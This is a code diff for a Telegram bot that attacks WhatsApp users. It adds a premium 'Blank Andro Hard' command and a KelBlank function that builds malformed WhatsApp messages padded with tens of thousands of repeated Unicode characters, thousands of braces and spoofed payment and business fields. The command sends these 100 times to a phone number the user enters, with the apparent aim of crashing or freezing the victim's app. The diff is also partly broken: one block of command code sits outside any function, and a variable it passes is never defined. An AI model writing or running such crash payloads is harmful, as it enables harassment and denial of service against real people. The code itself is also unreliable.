@@ -1778,6 +1778,7 @@ bot.action('/bug', async (ctx) => {
 🧬 - 𝐂𝐫𝐚𝐬𝐡 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
 ──────────────
 〢☐ /FaiqxRaraBlank [ Blank Andro ]
+〢☐ /FaiqxRaraBlankV2 [ Blank Andro Hard ]
 〢☐ /FaiqxRaraCrash [ Crash Andro ]
 〢☐ /FaiqxRaraCrashInvis [ Crash Andro Invisible ]
 
@@ -2175,7 +2176,7 @@ bot.command("FaiqxRaraForceInvis", checkWhatsAppConnection, checkPremium, checkC
 });
 
 
-bot.command("FaiqxRaraBlank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+bot.command("FaiqxRaraBlankV2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraBlank 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
@@ -2200,6 +2201,48 @@ bot.command("FaiqxRaraBlank", checkWhatsAppConnection, checkPremium, checkCooldo
 
     for (let i = 0; i < 100; i++) {
    await FaiqOffc(target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Blank Andro
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraBlank 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Blank Andro
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await KelBlank(target, type);
    await sleep(1000);
   }
 
@@ -2941,5 +2984,147 @@ async function FaiqOffc(target) {
     participant: { jid: target },
   });
 }
+
+async function KelBlank(target, type) {
+  const cards = [];
+  const header = {
+    videoMessage: {
+       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
+       mimetype: "video/mp4",
+       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
+       fileLength: 3714175,
+       seconds: 19,
+       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
+       height: 576,
+       width: 768,
+       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
+       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
+       mediaKeyTimestamp: "1751466051",
+       jpegThumbnail: "",
+       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
+    },
+    hasMediaAttachment: false,
+    body: {
+      text: "$",
+    },
+  };
+
+  const buttonsCommon = [
+    { name: "single_select", buttonParamsJson: "" },
+    { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
+    { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+  ];
+
+  const buttonsLocation = [];
+  for (let i = 0; i < 50; i++) {
+    buttonsLocation.push(
+      { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+      { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "icon": "RIVIEW","flow_cta": "$","flow_message_version": "3" }) },
+    );
+  }
+
+  let msgContent;
+  if (type === 'video') {
+    for (let r = 0; r < 35; r++) {
+      cards.push({
+        header,
+        nativeFlowMessage: {
+          messageParamsJson: "{".repeat(10000),
+          buttons: buttonsCommon,
+        },
+      });
+    }
+
+    msgContent = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "⃟꙰ " +
+                "ោ៝".repeat(10000) +
+                "ꦽ".repeat(25000),
+            },
+            carouselMessage: {
+              cards,
+              messageVersion: 1,
+            },
+            contextInfo: {
+              businessMessageForwardInfo: {
+                businessOwnerJid: "13135550002@s.whatsapp.net",
+              },
+              stanzaId: "1234567890ABCDEF",
+              forwardingScore: 100,
+              isForwarded: true,
+              participant: "13135550002@s.whatsapp.net",
+              mentionedJid: ["13135550002@s.whatsapp.net"],
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 3,
+                  expiryTimestamp: Date.now() + 1814400000,
+                },
+              },
+            },
+          },
+        },
+      },
+    };
+  } else if (type === 'location') {
+    msgContent = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "ꦽ".repeat(25000),
+              locationMessage: {
+                degreesLatitude: 1e5,
+                degreesLongtitude: 1e5,
+                isLive: true,
+                accuracyInMeters: 1e5,
+              },
+              hasMediaAttachment: true,
+            },
+            body: {
+              text: "&" +
+                "ោ៝".repeat(20000) +
+                "ꦽ".repeat(25000),
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+              buttons: buttonsLocation,
+            },
+            contextInfo: {
+              remoteJid: "X",
+              participant: "13135550202@s.whatsapp.net",
+              fromMe: false,
+              expiration: 7205,
+              ephemeralSettingTimestamp: 2502,
+              disappearingMode: {
+                initiator: "INITIATED_BY_OTHER",
+                trigger: "ACCOUNT_SETTING"
+              },
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 1,
+                  expiryTimestamp: 7205,
+                },
+              },
+            },
+          },
+        },
+      },
+    };
+  } else {
+    throw new Error('error');
+  }
+
+  const msg = await generateWAMessageFromContent(target, msgContent, {});
+
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
+}
+
 //============( END ) =======\\
 bot.launch()
